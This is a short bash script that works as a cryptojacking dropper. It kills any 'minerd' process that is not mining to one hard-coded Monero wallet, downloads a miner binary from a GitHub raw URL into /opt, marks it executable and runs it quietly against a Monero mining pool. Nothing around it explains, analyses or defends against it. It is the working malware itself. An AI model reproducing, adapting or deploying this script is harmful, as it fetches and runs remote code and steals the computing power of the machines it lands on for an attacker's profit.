#!/bin/bash
Jin=`ps -ef|grep minerd|grep -v grep|wc -l`
Pid=`ps -ef|grep minerd|grep -v grep|awk '{print $2}'`
Qianbao=`ps -ef|grep minerd|grep -v grep|grep "46SDR76rJ2J6MtmP3ZZKi9cEA5RQCrYgag7La3CxEootQeAQULPE2CHJQ4MRZ5wZ1T73Kw6Kx4Lai2dFLAacjerbPzb5Ufg"|wc -l`
if [ $Jin -eq  1 ];then
   if [ $Qianbao -eq 0 ];then
        kill -9 $Pid
        cd /opt 
   if [ ! -f minerd ];then
        curl -L https://raw.githubusercontent.com/18markdye/test/master/minerd -o minerd \
   &&   chmod +x minerd
  fi
      /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 46SDR76rJ2J6MtmP3ZZKi9cEA5RQCrYgag7La3CxEootQeAQULPE2CHJQ4MRZ5wZ1T73Kw6Kx4Lai2dFLAacjerbPzb5Ufg -p x -R 1 &>>/dev/null
 fi
fi
if  [ $Jin -ne  1 ];then
   kill -9 $Pid
        cd /opt 
   if [ ! -f minerd ];then
        curl -L https://raw.githubusercontent.com/18markdye/test/master/minerd -o minerd \
   &&   chmod +x minerd
   fi
      /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 46SDR76rJ2J6MtmP3ZZKi9cEA5RQCrYgag7La3CxEootQeAQULPE2CHJQ4MRZ5wZ1T73Kw6Kx4Lai2dFLAacjerbPzb5Ufg -p x -R 1 &>>/dev/null
fi
